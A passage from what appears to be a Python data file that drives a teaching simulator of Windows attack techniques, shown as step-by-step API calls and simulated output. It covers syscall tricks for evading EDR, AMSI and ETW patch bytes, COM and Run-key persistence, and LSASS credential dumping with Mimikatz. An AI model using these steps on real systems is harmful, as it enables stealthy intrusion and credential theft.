     "  7FFB_DD00_A187:  00 0F 05     syscall\n"
     "  7FFB_DD00_A18A:  C3           ret\n\n"
     "  SSN = 0x18  (not hooked — 32-bit EDR only patches 32-bit stubs)"),

    (3, "Prepare far JMP to selector 0x33",
     "  CPU segment selectors:\n"
     "  0x23 = 32-bit compatibility mode (current)\n"
     "  0x33 = 64-bit long mode (target)\n\n"
     "  Craft the far JMP target:\n"
     "  FAR_JMP_PTR = { offset = &gate64, selector = 0x33 }\n\n"
     "  gate64 is the label in 64-bit code we want to jump to\n"
     "  After the far JMP, the CPU switches to 64-bit mode"),

    (4, "Execute far JMP and syscall",
     "  [ 32-bit code ]\n"
     "  mov eax, 0x18         ; SSN for NtAllocateVirtualMemory\n"
     "  jmp far [FAR_JMP_PTR] ; CS = 0x33 → switch to 64-bit mode\n\n"
     "  ─── CPU switches to 64-bit long mode ───────────────────────\n\n"
     "  [ 64-bit code — gate64 label ]\n"
     "  mov r10, rcx          ; per Windows x64 ABI\n"
     "  syscall               ; enter kernel — SSN 0x18\n\n"
     "  The kernel handles the call.\n"
     "  32-bit ntdll hook was NEVER invoked."),

    (5, "Return to 32-bit mode",
     "  After syscall returns:\n"
     "  far jmp [return_ptr]  ; selector = 0x23 → back to 32-bit\n\n"
     "  ─── CPU switches back to 32-bit ────────────────────────────\n\n"
     "  [ 32-bit code resumes ]\n"
     "  EAX = NTSTATUS result from kernel\n\n"
     "  ✓ Syscall completed successfully\n"
     "  ✓ 32-bit ntdll hooks bypassed completely\n"
     "  ✓ EDR's 32-bit monitoring layer saw nothing"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Direct Syscalls / Hell's Gate walkthrough
# ─────────────────────────────────────────────────────────────────────────────

DIRECT_SYSCALL_STEPS = [
    (0, "Why NTDLL stubs are hooked",
     "  [ Normal API call flow ]\n"
     "  app.exe → ntdll!NtAllocateVirtualMemory → syscall → kernel\n\n"
     "  [ With EDR hook ]\n"
     "  app.exe → ntdll!NtAllocateVirtualMemory\n"
     "               ↓  [first 5 bytes = JMP to EDR]\n"
     "               → EDR.dll!HookHandler  ← inspects args\n"
     "               → original stub\n"
     "               → syscall → kernel\n\n"
     "  Goal: call the kernel directly, skip ntdll entirely."),

    (1, "Locate ntdll in memory (no GetModuleHandle)",
     "Walk PEB.Ldr.InMemoryOrderModuleList:\n"
     "  Entry[0] = ntdll.dll  base = 0x7FFB_DD00_0000\n\n"
     "  (Using PEB walk avoids calling any potentially-hooked API)"),

    (2, "Find target function and read SSN",
     "Walk ntdll export table for 'NtAllocateVirtualMemory':\n"
     "  → RVA = 0xA180   VA = 0x7FFB_DD00_A180\n\n"
     "  Read first bytes:\n"
     "  Case A — CLEAN stub:\n"
     "    4C 8B D1        mov r10, rcx\n"
     "    B8 18 00 00 00  mov eax, 0x18   ← SSN = 0x18\n"
     "    0F 05           syscall\n"
     "    C3              ret\n\n"
     "  Case B — HOOKED (Hell's Gate needed):\n"
     "    E9 XX XX XX XX  jmp EDRHook    ← SSN not visible!"),

    (3, "Hell's Gate: infer SSN from neighbours",
     "  [ Hooked stub detected at NtAllocateVirtualMemory ]\n"
     "  E9 ... JMP found at offset 0 — EDR hook present\n\n"
     "  Scan FORWARD through export table:\n"
     "  NtAlertResumeThread  +32 bytes → B8 19 00 00 00  SSN=0x19 (clean)\n"
     "  NtAlertThread        +64 bytes → B8 1A 00 00 00  SSN=0x1A (clean)\n\n"
     "  Inference:\n"
     "  NtAllocateVirtualMemory SSN = 0x19 - 1 = 0x18  ✓\n\n"
     "  Hell's Gate recovers SSN even when the target stub is hooked."),

    (4, "Build inline syscall stub",
     "  Embed stub bytes directly in your code:\n\n"
     "  unsigned char stub[] = {\n"
     "      0x4C, 0x8B, 0xD1,              // mov r10, rcx\n"
     "      0xB8, 0x18, 0x00, 0x00, 0x00,  // mov eax, SSN (patched at runtime)\n"
     "      0x0F, 0x05,                    // syscall\n"
     "      0xC3                           // ret\n"
     "  };\n\n"
     "  Patch stub[4..7] with the resolved SSN at runtime.\n"
     "  Mark stub memory PAGE_EXECUTE_READ before calling."),

    (5, "Execute and verify",
     "  Call stub as a function pointer:\n"
     "  NTSTATUS st = ((NTAPI_ALLOC)stub)(\n"
     "      GetCurrentProcess(), &base, 0,\n"
     "      &size, MEM_COMMIT, PAGE_READWRITE);\n\n"
     "  → NTSTATUS = 0x00000000 (STATUS_SUCCESS)\n"
     "  → base = 0x00270000\n\n"
     "  ✓ Allocation succeeded via direct syscall\n"
     "  ✓ ntdll stub never called\n"
     "  ✓ EDR hook never triggered\n"
     "  ✓ Stack trace shows return into your code, not ntdll"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Module Stomping walkthrough
# ─────────────────────────────────────────────────────────────────────────────

MODULE_STOMPING_STEPS = [
    (0, "Why file-backed memory is trusted",
     "  [ Memory region types ]\n"
     "  Private / anonymous:   suspicious if executable  ← EDR flags this\n"
     "  File-backed (module):  trusted — maps to a DLL on disk\n\n"
     "  Security tools check VAD (Virtual Address Descriptor) entries:\n"
     "  addr=0x6C000000  type=IMAGE  file=clrjit.dll  → TRUSTED\n"
     "  addr=0x00C00000  type=PRIVATE  file=<none>    → SUSPICIOUS\n\n"
     "  Module Stomping abuses this by putting shellcode\n"
     "  inside a region that is still VAD-mapped to a real file."),

    (1, "Load target DLL without running DllMain",
     "LoadLibraryExW(\n"
     "    L'C:\\Windows\\Microsoft.NET\\...\\clrjit.dll',\n"
     "    NULL,\n"
     "    DONT_RESOLVE_DLL_REFERENCES  ← no DllMain, no imports\n"
     ")\n"
     "  → hMod = 0x6C000000\n\n"
     "  [ VAD entry ]\n"
     "  0x6C000000  PAGE_EXECUTE_READ  IMAGE  clrjit.dll\n\n"
     "  clrjit.dll .text  @ 0x6C001000  size = 0x9A000"),

    (2, "Locate .text section",
     "Parse PE headers of loaded clrjit.dll:\n"
     "  IMAGE_NT_HEADERS @ 0x6C000108\n"
     "  Section .text:\n"
     "    VirtualAddress = 0x00001000\n"
     "    VirtualSize    = 0x0009A000\n"
     "    Characteristics = EXECUTE | READ\n\n"
     "  .text base = 0x6C000000 + 0x1000 = 0x6C001000\n"
     "  Available space = 630,784 bytes  (shellcode will fit)"),

    (3, "VirtualProtect .text → RWX",
     "VirtualProtect(0x6C001000, scLen, PAGE_EXECUTE_READWRITE, &old)\n"
     "  → old = PAGE_EXECUTE_READ\n\n"
     "  [ VAD entry — still shows clrjit.dll! ]\n"
     "  0x6C000000  PAGE_EXECUTE_READWRITE  IMAGE  clrjit.dll\n\n"
     "  Note: RWX is briefly anomalous — the next step fixes this."),

    (4, "Overwrite .text with shellcode",
     "memcpy(0x6C001000, shellcode, scLen)\n"
     "  → Shellcode written to clrjit.dll .text section\n\n"
     "VirtualProtect(0x6C001000, scLen, PAGE_EXECUTE_READ, &old)\n"
     "  → Restored to PAGE_EXECUTE_READ — RWX anomaly gone\n\n"
     "  [ Memory content @ 0x6C001000 ]\n"
     "  On disk (clrjit.dll): FC 48 83 E4 F0 ... (legitimate code)\n"
     "  In memory:            90 90 90 E8 ...    (shellcode)"),

    (5, "Execute — appears to be legitimate DLL code",
     "((void(*)())0x6C001000)()\n"
     "  → Shellcode executes\n\n"
     "  [ What security tools see ]\n"
     "  Thread RIP = 0x6C001000\n"
     "  VAD:         0x6C000000  IMAGE  clrjit.dll\n"
     "  File check:  C:\\...\\clrjit.dll  (hash = legitimate)\n\n"
     "  ✓ Memory appears to be the real clrjit.dll\n"
     "  ✓ No anonymous RX pages\n"
     "  ✗ In-memory content doesn't match disk — pe-sieve catches this"),
]


# ─────────────────────────────────────────────────────────────────────────────
# ETW Patching walkthrough
# ─────────────────────────────────────────────────────────────────────────────

ETW_PATCH_STEPS = [
    (0, "ETW architecture",
     "  [ ETW event flow ]\n"
     "  Provider (ntdll, CLR, PS) → EtwEventWrite() → ETW kernel buffer\n"
     "      → ETW consumer (Defender, EDR, Event Log)\n\n"
     "  EtwEventWrite @ ntdll.dll + 0xA3F20:\n"
     "    48 8B C4        mov rax, rsp\n"
     "    48 89 58 08     mov [rax+8], rbx\n"
     "    ... (writes event to kernel)\n\n"
     "  Patching this to RET stops ALL events before they reach the kernel."),

    (1, "Resolve EtwEventWrite address",
     "GetProcAddress(GetModuleHandleA('ntdll.dll'), 'EtwEventWrite')\n"
     "  → 0x7FFB_DD00_A3F20\n\n"
     "  Current bytes @ 0x7FFB_DD00_A3F20:\n"
     "  48 8B C4  mov rax, rsp\n"
     "  48 89 58  mov [rax+8], rbx\n"
     "  08 4C 89  mov [rax+16], rsi\n"
     "  ..."),

    (2, "VirtualProtect → writable",
     "VirtualProtect(0x7FFB_DD00_A3F20, 1,\n"
     "               PAGE_EXECUTE_READWRITE, &old)\n"
     "  → old = PAGE_EXECUTE_READ\n"
     "  → Function is now writable"),

    (3, "Write RET patch",
     "*(BYTE*)0x7FFB_DD00_A3F20 = 0xC3  // RET\n\n"
     "  Bytes @ 0x7FFB_DD00_A3F20 AFTER patch:\n"
     "  C3  ret    ← immediately returns, does nothing\n"
     "  8B C4      (rest of function, never reached)\n"
     "  48 89 58\n"
     "  ..."),

    (4, "Restore page protection",
     "VirtualProtect(0x7FFB_DD00_A3F20, 1, PAGE_EXECUTE_READ, &old)\n"
     "  → Restored to RX — no more RWX anomaly"),

    (5, "Effect: all ETW events silenced",
     "  [ After patch — ETW call trace ]\n"
     "  Provider → EtwEventWrite()\n"
     "      → C3 (RET)  ← returns immediately\n"
     "      → Event NEVER reaches ETW kernel buffer\n"
     "      → Defender/EDR consumer sees NOTHING\n\n"
     "  Affected telemetry:\n"
     "  ✓ Windows Defender AMSI events\n"
     "  ✓ PowerShell ScriptBlock logging\n"
     "  ✓ .NET runtime events\n"
     "  ✓ EDR behavioral telemetry (via user-mode ETW)\n\n"
     "  NOT affected (kernel ETW):\n"
     "  ✗ PsSetCreateProcessNotifyRoutine\n"
     "  ✗ Kernel ETW-TI provider"),
]


# ─────────────────────────────────────────────────────────────────────────────
# AMSI Bypass walkthrough
# ─────────────────────────────────────────────────────────────────────────────

AMSI_STEPS = [
    (0, "AMSI architecture",
     "  [ AMSI scan flow — normal ]\n"
     "  PowerShell/WSH/CLR → AmsiScanBuffer(ctx, buf, len)\n"
     "      → amsi.dll → AV provider (via COM)\n"
     "      → returns AMSI_RESULT_DETECTED (32768) or AMSI_RESULT_CLEAN (1)\n\n"
     "  amsi.dll is loaded into every script host process.\n"
     "  AmsiScanBuffer is the single chokepoint for ALL script content."),

    (1, "Resolve AmsiScanBuffer",
     "GetModuleHandleA('amsi.dll')  → 0x7FFA_E000_0000\n"
     "GetProcAddress(amsi, 'AmsiScanBuffer')  → 0x7FFA_E000_1A20\n\n"
     "  Original bytes @ 0x7FFA_E000_1A20:\n"
     "  4C 8B DC    mov r11, rsp\n"
     "  49 89 53 08 mov [r11+8], rdx\n"
     "  49 89 4B 10 mov [r11+16], rcx\n"
     "  ..."),

    (2, "VirtualProtect → writable",
     "VirtualProtect(0x7FFA_E000_1A20, 6,\n"
     "               PAGE_EXECUTE_READWRITE, &old)\n"
     "  → old = PAGE_EXECUTE_READ"),

    (3, "Write patch bytes",
     "  Patch: MOV EAX, 0x80070057 + RET\n"
     "  Bytes: B8 57 00 07 80 C3\n\n"
     "memcpy(0x7FFA_E000_1A20, patch, 6)\n\n"
     "  Patched bytes @ 0x7FFA_E000_1A20:\n"
     "  B8 57 00 07 80  mov eax, 0x80070057  (E_INVALIDARG)\n"
     "  C3              ret\n"
     "  (rest of function never reached)"),

    (4, "Restore protection",
     "VirtualProtect(0x7FFA_E000_1A20, 6, PAGE_EXECUTE_READ, &old)\n"
     "  → Restored"),

    (5, "AMSI bypassed — scan result is always clean",
     "  [ Patched scan call trace ]\n"
     "  AmsiScanBuffer(ctx, 'Invoke-Mimikatz', len, ...)\n"
     "      → B8 57 00 07 80  mov eax, 0x80070057\n"
     "      → C3              ret\n"
     "      → caller receives E_INVALIDARG → treated as CLEAN\n\n"
     "  ✓ 'Invoke-Mimikatz' passes AMSI scan\n"
     "  ✓ Malicious .NET assemblies load without scan\n"
     "  ✓ Obfuscated shellcode executes undetected\n\n"
     "  Covers:\n"
     "  ✓ PowerShell script scanning\n"
     "  ✓ WMI script scanning\n"
     "  ✓ .NET assembly scanning (AMSI for CLR)\n"
     "  ✓ COM Scriptlet scanning"),
]


# ─────────────────────────────────────────────────────────────────────────────
# COM Hijacking walkthrough
# ─────────────────────────────────────────────────────────────────────────────

COM_HIJACK_STEPS = [
    (0, "COM object lookup order",
     "  When CoCreateInstance({CLSID}) is called, Windows searches:\n\n"
     "  1. HKCU\\Software\\Classes\\CLSID\\{...}\\InprocServer32\n"
     "     → if found: load this DLL  ← attacker writes here\n\n"
     "  2. HKLM\\Software\\Classes\\CLSID\\{...}\\InprocServer32\n"
     "     → if found: load this DLL  ← legitimate registration\n\n"
     "  HKCU requires NO admin privileges — any user can write it.\n"
     "  HKCU takes precedence over HKLM."),

    (1, "Identify hijackable CLSIDs with ProcMon",
     "  ProcMon filter: Operation = RegOpenKey  Result = NAME NOT FOUND\n"
     "  Path contains: HKCU\\...\\CLSID\n\n"
     "  Results (Explorer.exe):\n"
     "  HKCU\\Software\\Classes\\CLSID\\{BCDE0395-...}  NAME NOT FOUND ← hijackable!\n"
     "  HKCU\\Software\\Classes\\CLSID\\{D63B10C5-...}  NAME NOT FOUND ← hijackable!\n\n"
     "  These CLSIDs are instantiated by Explorer but only registered in HKLM."),

    (2, "Register malicious DLL in HKCU",
     "RegCreateKeyExW(HKCU,\n"
     "    'Software\\Classes\\CLSID\\{BCDE0395-...}\\InprocServer32')\n\n"
     "RegSetValueExW(hKey, NULL, REG_SZ,\n"
     "    L'C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll')\n\n"
     "RegSetValueExW(hKey, L'ThreadingModel', REG_SZ, L'Apartment')\n\n"
     "  [ HKCU registry — after install ]\n"
     "  HKCU\\Software\\Classes\\CLSID\\{BCDE0395-...}\\\n"
     "    InprocServer32\\\n"
     "      (default) = C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll\n"
     "      ThreadingModel = Apartment"),

    (3, "Trigger: application starts and instantiates COM object",
     "  [ Next time Explorer.exe starts ]\n"
     "  CoCreateInstance({BCDE0395-...})\n"
     "    → COM runtime looks up CLSID\n"
     "    → Checks HKCU first\n"
     "    → FOUND: C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll\n"
     "    → LoadLibrary('...\\payload.dll')\n"
     "    → DllMain(DLL_PROCESS_ATTACH) ← your payload runs here"),

    (4, "Persistence and privilege context",
     "  payload.dll runs INSIDE Explorer.exe:\n"
     "  ✓ Explorer's integrity level (Medium)\n"
     "  ✓ Explorer's user context\n"
     "  ✓ All Explorer's open handles and tokens\n\n"
     "  Persistence:\n"
     "  ✓ Registry key survives reboot\n"
     "  ✓ Fires every time the target app starts\n"
     "  ✓ No new processes created\n"
     "  ✓ No scheduled tasks or services needed\n\n"
     "  Cleanup: RegDeleteTreeW(HKCU, 'Software\\Classes\\CLSID\\{BCDE0395-...}')"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Registry Run Key Persistence walkthrough
# ─────────────────────────────────────────────────────────────────────────────

REGISTRY_PERSIST_STEPS = [
    (0, "Run key locations overview",
     "  Registry autorun locations (most common):\n\n"
     "  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
     "    → Runs for current user on logon  (no admin needed)\n\n"
     "  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
     "    → Runs for ALL users on logon  (admin required)\n\n"
     "  HKCU\\...\\RunOnce\n"
     "    → Runs once, then deletes itself\n\n"
     "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n"
     "    → Userinit / Shell values  (more stealthy, admin)"),

    (1, "Open the Run key",
     "RegOpenKeyExA(\n"
     "    HKEY_CURRENT_USER,\n"
     "    'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',\n"
     "    0, KEY_WRITE, &hKey\n"
     ")\n"
     "  → hKey = 0x00000080\n"
     "  → Key opened for writing (no admin required for HKCU)"),

    (2, "Write the persistence value",
     "RegSetValueExA(\n"
     "    hKey,\n"
     "    'WindowsUpdateHelper',       ← masquerades as update service\n"
     "    0,\n"
     "    REG_SZ,\n"
     "    'C:\\Users\\user\\AppData\\Roaming\\svcupdate.exe',\n"
     "    pathLen\n"
     ")\n"
     "  → ERROR_SUCCESS\n\n"
     "  [ HKCU Run key after install ]\n"
     "  OneDrive      = C:\\Users\\user\\AppData\\...\\OneDrive.exe\n"
     "  WindowsUpdateHelper = C:\\...\\AppData\\Roaming\\svcupdate.exe  ← NEW"),

    (3, "User logs off and back on",
     "  Windows reads Run key at logon:\n"
     "  1. OneDrive.exe  → starts normally\n"
     "  2. svcupdate.exe → starts payload\n\n"
     "  Payload runs with user's token and privileges\n"
     "  No UAC prompt\n"
     "  No visible window (if compiled as SUBSYSTEM:WINDOWS)"),

    (4, "Alternative: Scheduled Task",
     "  Run keys are heavily monitored — scheduled tasks are stealthier:\n\n"
     "  schtasks /create\n"
     "      /tn 'MicrosoftEdgeUpdateCore'\n"
     "      /tr 'C:\\...\\svcupdate.exe'\n"
     "      /sc onlogon\n"
     "      /rl highest\n"
     "      /f\n\n"
     "  Advantages over Run keys:\n"
     "  ✓ Harder to spot in Autoruns without known-bad heuristics\n"
     "  ✓ More trigger options (on idle, on event, repeating)\n"
     "  ✓ Can run elevated (/rl highest)"),

    (5, "Cleanup",
     "RegDeleteValueA(hKey, 'WindowsUpdateHelper')\n"
     "  → ERROR_SUCCESS — value removed\n\n"
     "  [ HKCU Run key after cleanup ]\n"
     "  OneDrive = C:\\Users\\user\\AppData\\...\\OneDrive.exe\n"
     "  (WindowsUpdateHelper entry is gone)\n\n"
     "  For scheduled task: schtasks /delete /tn 'MicrosoftEdgeUpdateCore' /f"),
]


# ─────────────────────────────────────────────────────────────────────────────
# LSASS Dumping walkthrough
# ─────────────────────────────────────────────────────────────────────────────

LSASS_STEPS = [
    (0, "What lives in LSASS memory",
     "  lsass.exe — Local Security Authority Subsystem Service\n\n"
     "  Credential caches in memory:\n"
     "  ┌─────────────────────────────────────────────────────┐\n"
     "  │ MSV1_0 (NTLM)   → NTLM hash + LM hash              │\n"
     "  │ Kerberos        → TGT, service tickets, session key │\n"
     "  │ WDigest         → cleartext (if reg key enabled)    │\n"
     "  │ LiveSSP         → Microsoft account credentials     │\n"
     "  │ DPAPI           → master keys for encrypted data    │\n"
     "  └─────────────────────────────────────────────────────┘\n\n"
     "  Target: dump lsass.exe memory → offline processing → credentials"),

    (1, "Enable SeDebugPrivilege",
     "OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)\n"
     "LookupPrivilegeValue(NULL, 'SeDebugPrivilege', &luid)\n"
     "AdjustTokenPrivileges(hToken, FALSE, &tp, ...)\n\n"
     "  → SeDebugPrivilege ENABLED\n"
     "  → Can now open any process regardless of DACL\n"
     "  (Requires local admin — standard user cannot enable SeDebugPrivilege)"),

    (2, "Find LSASS PID",
     "CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)\n"
     "  Walk process list:\n"
     "  PID=4     System\n"
     "  PID=512   smss.exe\n"
     "  PID=632   csrss.exe\n"
     "  PID=700   lsass.exe   ← FOUND\n"
     "  PID=844   svchost.exe\n"
     "  ...\n"
     "  → LSASS PID = 700"),

    (3, "OpenProcess on LSASS",
     "OpenProcess(\n"
     "    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,\n"
     "    FALSE, 700\n"
     ")\n"
     "  → hLsass = 0x000000A4\n\n"
     "  Note: on Windows 10+ with PPL enabled:\n"
     "  → OpenProcess returns ERROR_ACCESS_DENIED\n"
     "  → Need kernel driver or PPL bypass to proceed"),

    (4, "MiniDumpWriteDump",
     "hFile = CreateFile('C:\\Windows\\Temp\\lsass.dmp', GENERIC_WRITE, ...)\n\n"
     "MiniDumpWriteDump(\n"
     "    hLsass,          ← LSASS handle\n"
     "    700,             ← PID\n"
     "    hFile,           ← output file\n"
     "    MiniDumpWithFullMemory,\n"
     "    NULL, NULL, NULL\n"
     ")\n"
     "  → TRUE — dump written\n"
     "  → File size: ~60 MB (full LSASS memory)"),

    (5, "Offline processing with Mimikatz",
     "  Transfer lsass.dmp to attacker machine, then:\n\n"
     "  mimikatz # sekurlsa::minidump lsass.dmp\n"
     "  mimikatz # sekurlsa::logonpasswords\n\n"
     "  Output:\n"
     "  Authentication Id : 0 ; 999 (00000000:000003e7)\n"
     "  Session           : Interactive from 1\n"
     "  UserName          : Administrator\n"
     "  Domain            : CORP\n"
     "  Logon Server      : DC01\n"
     "  NTLM              : e19ccf75ee54e06b06a5907af13cef42  ← crack or PTH\n"
     "  Kerberos TGT      : [ticket data]  ← Pass-the-Ticket\n\n"
     "  Defense: Enable Credential Guard (moves secrets into VSM)\n"
     "           Enable RunAsPPL for LSASS (blocks OpenProcess)"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Step data registry
# ─────────────────────────────────────────────────────────────────────────────

SIMULATION_STEPS = {
    "iat_hooking":            IAT_STEPS,
    "classic_dll_injection":  DLL_INJECTION_STEPS,
    "process_hollowing":      HOLLOWING_STEPS,
    "apc_injection":          APC_STEPS,
    "thread_hijacking":       HIJACK_STEPS,
    "reflective_dll":         REFLECTIVE_STEPS,
    "atom_bombing":           ATOM_STEPS,
    "ntdll_unhooking":        UNHOOK_STEPS,
    "process_doppelganging":  DOPPELGANGING_STEPS,
    "heavens_gate":           HEAVENS_GATE_STEPS,
    "direct_syscalls":        DIRECT_SYSCALL_STEPS,
    "module_stomping":        MODULE_STOMPING_STEPS,
    "etw_patching":           ETW_PATCH_STEPS,
    "amsi_bypass":            AMSI_STEPS,
    "com_hijacking":          COM_HIJACK_STEPS,
    "registry_persistence":   REGISTRY_PERSIST_STEPS,
    "lsass_dumping":          LSASS_STEPS,
}
